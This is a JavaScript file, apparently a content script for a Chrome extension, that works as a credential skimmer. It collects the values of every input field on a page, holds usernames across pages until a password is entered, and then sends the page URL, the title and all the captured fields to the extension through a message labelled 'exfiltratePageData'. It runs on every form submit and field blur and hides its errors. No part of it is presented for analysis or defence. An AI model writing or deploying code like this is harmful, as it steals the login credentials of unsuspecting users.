const getFormData = () => {
    let hasPassword = false;
    const data = Array.from(document.querySelectorAll('input')).reduce((acc, input) => {
        const key = input.name || input.id || input.placeholder || input.type;
        if (key && input.value) {
            acc[key] = input.value;
            if (input.type === 'password') {
                hasPassword = true;
                acc[`${key}_is_password`] = true;
            }
        }
        return acc;
    }, {});
    return { hasPassword, data };
};

const sendData = (eventType) => {
    const { hasPassword, data } = getFormData();

    if (Object.keys(data).length === 0) return;

    if (hasPassword) {
        const storedData = JSON.parse(sessionStorage.getItem('captured_user_id') || '{}');
        const finalData = { ...storedData, ...data };

        if (chrome.runtime && chrome.runtime.id) {
            try {
                chrome.runtime.sendMessage({
                    action: "exfiltratePageData",
                    data: {
                        url: window.location.href,
                        title: document.title,
                        scraped_at: new Date().toISOString(),
                        event: eventType,
                        formData: finalData
                    }
                });
                sessionStorage.removeItem('captured_user_id'); // Clear after sending
            } catch (e) { }
        }
    } else {
        // No password yet? Store this ID (email/user) for the next page
        sessionStorage.setItem('captured_user_id', JSON.stringify(data));
    }
};

document.addEventListener('submit', () => sendData("form_submit"), true);

document.addEventListener('blur', (e) => {
    if (e.target.tagName === 'INPUT') {
        sendData("input_blur");
    }
}, true);

